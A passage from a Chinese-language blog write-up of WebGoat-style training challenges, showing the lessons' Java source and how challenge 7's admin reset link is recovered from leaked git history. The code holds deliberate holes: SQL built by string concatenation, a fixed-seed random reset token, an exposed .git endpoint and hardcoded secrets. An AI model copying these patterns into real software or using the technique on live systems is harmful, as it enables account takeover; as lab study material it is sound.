class="line">            attackResult  = success(<span class="built_in">this</span>).feedback(<span class="string">&quot;challenge.flag.correct&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            userTracker.assignmentFailed(webSession.getCurrentLesson());</span><br><span class="line">            attackResult = failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;challenge.flag.incorrect&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        userTrackerRepository.save(userTracker);</span><br><span class="line">        <span class="keyword">return</span> attackResult;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SolutionConstants"><a href="#SolutionConstants" class="headerlink" title="SolutionConstants"></a>SolutionConstants</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SolutionConstants</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;!!webgoat_admin_1234!!&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">PASSWORD_TOM</span> <span class="operator">=</span> <span class="string">&quot;thisisasecretfortomonly&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ADMIN_PASSWORD_LINK</span> <span class="operator">=</span> <span class="string">&quot;375afe1104f4a487a73823c50a9292a2&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h3><h4 id="Challenge1"><a href="#Challenge1" class="headerlink" title="Challenge1"></a>Challenge1</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges.challenge1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Challenge1</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.CHALLENGE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;challenge1.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="ImageServlet"><a href="#ImageServlet" class="headerlink" title="ImageServlet"></a>ImageServlet</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges.challenge1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ClassPathResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.web.bind.annotation.RequestMethod.GET;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.web.bind.annotation.RequestMethod.POST;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ImageServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">9132775506936676850L</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">public</span> <span class="type">int</span> <span class="variable">PINCODE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureRandom</span>().nextInt(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(method = &#123;GET,POST&#125;,value = &quot;/challenge/logo&quot;,produces = MediaType.IMAGE_PNG_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] logo() <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">byte</span>[] in = <span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;lessons/challenges/images/webgoat2.png&quot;</span>).getInputStream().readAllBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">pincode</span> <span class="operator">=</span> String.format(<span class="string">&quot;%04d&quot;</span>,PINCODE);</span><br><span class="line"></span><br><span class="line">        in[<span class="number">81216</span>] = (<span class="type">byte</span>)pincode.charAt(<span class="number">0</span>);</span><br><span class="line">        in[<span class="number">81217</span>] = (<span class="type">byte</span>)pincode.charAt(<span class="number">1</span>);</span><br><span class="line">        in[<span class="number">81218</span>] = (<span class="type">byte</span>)pincode.charAt(<span class="number">2</span>);</span><br><span class="line">        in[<span class="number">81219</span>] = (<span class="type">byte</span>)pincode.charAt(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">return</span> in;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Assignment1"><a href="#Assignment1" class="headerlink" title="Assignment1"></a>Assignment1</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges.challenge1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.challenges.Flag;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.parameters.P;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.wanan.webgoat.lessons.challenges.SolutionConstants.PASSWORD;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Assignment1</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/challenge/1&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String username, <span class="meta">@RequestParam</span> String password, HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ipAddressKnown</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">passwordCorrect</span> <span class="operator">=</span> <span class="string">&quot;admin&quot;</span>.equals(username) &amp;&amp; PASSWORD.replace(<span class="string">&quot;1234&quot;</span>,String.format(<span class="string">&quot;%04d&quot;</span>,ImageServlet.PINCODE)).equals(password);</span><br><span class="line">        <span class="keyword">if</span> (passwordCorrect &amp;&amp; ipAddressKnown) &#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;challenge.solved&quot;</span>).feedbackArgs(Flag.FLAGS.get(<span class="number">1</span>)).build();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (passwordCorrect) &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;ip.address.unknown&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">containsHeader</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> StringUtils.hasText(request.getHeader(<span class="string">&quot;X-Forwarded-For&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916161838205.png" alt="image-20220916161838205"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916161845528.png" alt="image-20220916161845528"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916161913369.png" alt="image-20220916161913369"></p>
<h3 id="challenge5"><a href="#challenge5" class="headerlink" title="challenge5"></a>challenge5</h3><h4 id="Challenge5"><a href="#Challenge5" class="headerlink" title="Challenge5"></a>Challenge5</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges.challenge5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Challenge5</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.CHALLENGE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;challenge5.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Assignment5"><a href="#Assignment5" class="headerlink" title="Assignment5"></a>Assignment5</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges.challenge5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.challenges.Flag;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Assignment5</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Assignment5</span><span class="params">(LessonDataSource dataSource)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/challenge/5&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">login</span><span class="params">(<span class="meta">@RequestParam</span> String username_login,<span class="meta">@RequestParam</span> String password_login)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.hasText(username_login) || !StringUtils.hasText(password_login))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;required4&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;Larry&quot;</span>.equals(username_login))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;user.not.larry&quot;</span>).feedbackArgs(username_login).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection())&#123;</span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;select password from challenge_users where userid = &#x27;&quot;</span> + username_login + <span class="string">&quot;&#x27; and password = &#x27;&quot;</span> + password_login + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line">            <span class="keyword">if</span> (resultSet.next())&#123;</span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;challenge.solved&quot;</span>).feedbackArgs(Flag.FLAGS.get(<span class="number">5</span>)).build();</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;challenge.close&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916164043242.png" alt="image-20220916164043242"></p>
<h3 id="challenge7"><a href="#challenge7" class="headerlink" title="challenge7"></a>challenge7</h3><h4 id="Challenge7"><a href="#Challenge7" class="headerlink" title="Challenge7"></a>Challenge7</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges.challenge7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Challenge7</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.CHALLENGE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;challenge7.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Email-2"><a href="#Email-2" class="headerlink" title="Email"></a>Email</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges.challenge7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Email</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> LocalDateTime time;</span><br><span class="line">    <span class="keyword">private</span> String contents;</span><br><span class="line">    <span class="keyword">private</span> String sender;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String recipient;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p>MD5工具类</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916171722079.png" alt="image-20220916171722079"></p>
<h4 id="PasswordResetLink"><a href="#PasswordResetLink" class="headerlink" title="PasswordResetLink"></a>PasswordResetLink</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges.challenge7;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PasswordResetLink</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">createPasswordReset</span><span class="params">(String username,String key)</span>&#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">if</span> (username.equalsIgnoreCase(<span class="string">&quot;admin&quot;</span>))&#123;</span><br><span class="line">            random.setSeed(key.length());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> scramble(random,scramble(random,scramble(random,MD5.getHashString(username))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">scramble</span><span class="params">(Random random,String inputString)</span>&#123;</span><br><span class="line">        <span class="type">char</span>[] a = inputString.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length;i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> random.nextInt(a.length);</span><br><span class="line">            <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> a[i];</span><br><span class="line">            a[i] = a[j];</span><br><span class="line">            a[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Assignment7"><a href="#Assignment7" class="headerlink" title="Assignment7"></a>Assignment7</h4><p>注意差异</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916180141412.png" alt="image-20220916180141412"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges.challenge7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.challenges.Flag;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.challenges.SolutionConstants;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ClassPathResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Assignment7</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TEMPLATE</span> <span class="operator">=</span> <span class="string">&quot;Hi, you requested a password reset link, please use this &quot;</span></span><br><span class="line">            + <span class="string">&quot;&lt;a target=&#x27;_blank&#x27; href=&#x27;%s:8080/WebGoat/challenge/7/reset-password/%s&#x27;&gt;link&lt;/a&gt; to reset your password.&quot;</span></span><br><span class="line">            + <span class="string">&quot;\n \n\n&quot;</span></span><br><span class="line">            + <span class="string">&quot;If you did not request this password change you can ignore this message.&quot;</span></span><br><span class="line">            + <span class="string">&quot;\n&quot;</span></span><br><span class="line">            + <span class="string">&quot;If you have any comments or questions, please do not hesitate to reach us at support@webgoat-cloud.org&quot;</span></span><br><span class="line">            + <span class="string">&quot;\n\n&quot;</span></span><br><span class="line">            + <span class="string">&quot;Kind regards, \nTeam WebGoat&quot;</span>;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;webwolf.mail.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String webWolfMailURL;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/challenge/7/reset-password/&#123;link&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String &gt; resetPassword(<span class="meta">@PathVariable(value = &quot;link&quot;)</span> String link)&#123;</span><br><span class="line">        <span class="keyword">if</span> (link.equals(SolutionConstants.ADMIN_PASSWORD_LINK))&#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.accepted().body(<span class="string">&quot;&lt;h1&gt;Success!!&lt;/h1&gt;&quot;</span></span><br><span class="line">                    + <span class="string">&quot;&lt;img src=&#x27;/WebGoat/images/hi-five-cat.jpg&#x27;&gt;&quot;</span></span><br><span class="line">                    + <span class="string">&quot;&lt;br/&gt;&lt;br/&gt;Here is your flag: &quot;</span> + <span class="string">&quot;&lt;b&gt;&quot;</span> + Flag.FLAGS.get(<span class="number">7</span>) + <span class="string">&quot;&lt;/b&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(HttpStatus.I_AM_A_TEAPOT).body(<span class="string">&quot;That is not the reset link for admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/challenge/7&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">sendPasswordResetLink</span><span class="params">(<span class="meta">@RequestParam</span> String email, HttpServletRequest request)</span><span class="keyword">throws</span> URISyntaxException&#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(email))&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> email.substring(<span class="number">0</span>,email.indexOf(<span class="string">&quot;@&quot;</span>));</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.hasText(username))&#123;</span><br><span class="line">                <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(request.getRequestURI().toString());</span><br><span class="line">                <span class="type">Email</span> <span class="variable">mail</span> <span class="operator">=</span> Email.builder()</span><br><span class="line">                        .title(<span class="string">&quot;Your password reset link for challenge 7&quot;</span>)</span><br><span class="line">                        .contents(String.format(TEMPLATE,uri.getScheme() + <span class="string">&quot;://&quot;</span> + uri.getHost(),<span class="keyword">new</span> <span class="title class_">PasswordResetLink</span>().createPasswordReset(username,<span class="string">&quot;webgoat&quot;</span>)))</span><br><span class="line">                        .sender(<span class="string">&quot;password-reset@webgoat-cloud.net&quot;</span>)</span><br><span class="line">                        .recipient(username)</span><br><span class="line">                        .time(LocalDateTime.now()).build();</span><br><span class="line">                restTemplate.postForEntity(webWolfMailURL,mail,Object.class);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;email.send&quot;</span>).feedbackArgs(email).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/challenge/7/.git&quot;,produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)</span></span><br><span class="line"><span class="comment">//    源码泄露</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ClassPathResource <span class="title function_">git</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;lessons/challenges/challenge7/git.zip&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里的话其他的地方是没什么问题的 问题出在这个admin的重置链接上面</p>
<p>我们跟到这里</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916175630366.png" alt="image-20220916175630366"></p>
<p>可以看到这里对random设置了一个 seed 并且这个值还是一个固定的值 那么这里会发生什么呢 ?</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916175659295.png" alt="image-20220916175659295"></p>
<p>没错 这里就会导致每次生成的随机数都是相同的 可以自行尝试  这里也就导致了最终的admin重置链接会是相同的 那么我们只需要拿到源码就可以获取到 admin的重置链接</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916175803866.png" alt="image-20220916175803866"></p>
<p>回到题目本身 首先我们需要获取到源码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916180347308.png" alt="image-20220916180347308"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916180510821.png" alt="image-20220916180510821"></p>
<p>打开之后是一个git 那么现在我们需要回档 于git的上级目录进行操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916180639971.png" alt="image-20220916180639971"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916180735008.png" alt="image-20220916180735008"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916180823948.png" alt="image-20220916180823948"></p>
<p>直接拖进去反编译一下 这里其实不太好搞 首先我们的username 我们知道是 admin 那这里的key呢?   其实就在 var2中给定义好了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916185301418.png" alt="image-20220916185301418"></p>
<p>拿到link</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">375afe1104f4a487a73823c50a9292a2</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916190033285.png" alt="image-20220916190033285"></p>
